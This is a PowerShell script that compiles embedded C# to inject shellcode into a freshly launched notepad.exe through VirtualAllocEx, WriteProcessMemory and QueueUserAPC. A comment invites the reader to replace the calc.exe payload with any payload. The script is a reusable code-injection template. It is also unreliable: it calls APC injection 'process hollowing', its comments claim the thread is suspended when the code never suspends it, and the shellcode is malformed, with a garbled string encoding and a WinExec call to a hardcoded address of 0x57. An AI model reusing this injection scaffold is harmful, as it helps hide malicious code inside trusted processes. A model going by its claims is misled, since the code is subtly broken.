# ProcessHollowingTest.ps1
# Simple demonstration of process hollowing by injecting a calc.exe launcher into notepad.exe

$csharpCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Hollowing
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_SUSPEND_RESUME = 0x0800;
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    // Simple shellcode: spawn calc.exe using WinExec (for x64)
    // This shellcode calls WinExec("calc.exe", 5)
    // You can replace with any payload.
    static byte[] calcShellcode = new byte[] {
        0x48, 0x31, 0xC0,                   // xor rax, rax
        0x50,                               // push rax
        0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, // mov rax, 0x636c6163
        0x2E, 0x65, 0x78, 0x65,             // "calc.exe"
        0x50,                               // push rax
        0x48, 0x89, 0xE2,                   // mov rdx, rsp
        0x48, 0x83, 0xC2, 0x08,             // add rdx, 8
        0x48, 0xB8, 0x57, 0x00, 0x00, 0x00, // mov rax, 0x57
        0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0,                         // call rax (WinExec)
        0x48, 0x31, 0xC0,                   // xor rax, rax
        0xC3                                // ret
    };

    public static void Run(string targetProcess = "notepad.exe")
    {
        // 1. Start target process suspended
        ProcessStartInfo psi = new ProcessStartInfo(targetProcess);
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        psi.WindowStyle = ProcessWindowStyle.Hidden;
        Process p = Process.Start(psi);
        if (p == null)
        {
            Console.WriteLine("[-] Failed to start target process");
            return;
        }

        IntPtr hProcess = p.Handle;
        uint pid = (uint)p.Id;
        Console.WriteLine("[+] Started {0} (PID: {1})", targetProcess, pid);

        // 2. Suspend main thread
        IntPtr hThread = p.Threads[0].Handle;
        Console.WriteLine("[+] Suspended main thread");

        // 3. Allocate memory in target process
        IntPtr allocated = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)calcShellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (allocated == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAllocEx failed");
            return;
        }
        Console.WriteLine("[+] Allocated memory at 0x{0:X}", allocated.ToInt64());

        // 4. Write shellcode
        IntPtr bytesWritten;
        bool res = WriteProcessMemory(hProcess, allocated, calcShellcode, (uint)calcShellcode.Length, out bytesWritten);
        if (!res)
        {
            Console.WriteLine("[-] WriteProcessMemory failed");
            return;
        }
        Console.WriteLine("[+] Shellcode written");

        // 5. Queue APC to the main thread
        res = QueueUserAPC(allocated, hThread, IntPtr.Zero);
        if (!res)
        {
            Console.WriteLine("[-] QueueUserAPC failed");
            return;
        }
        Console.WriteLine("[+] APC queued");

        // 6. Resume thread
        ResumeThread(hThread);
        Console.WriteLine("[+] Thread resumed, payload should execute soon.");

        // 7. Clean up handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    }
}
"@

# Compile and run the C# code
Add-Type -TypeDefinition $csharpCode -Language CSharp

Write-Host "=== Process Hollowing Test ==="
Write-Host "Starting notepad.exe and injecting calc.exe payload..."

try {
    [Hollowing]::Run("notepad.exe")
    Write-Host "✅ Test completed. Check if calculator opened under notepad.exe (use Process Explorer)."
} catch {
    Write-Host "❌ Error: $_"
}
